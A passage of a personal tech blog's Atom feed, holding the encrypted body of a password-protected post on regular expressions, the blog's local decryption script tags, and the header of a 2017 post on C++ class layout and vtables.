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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
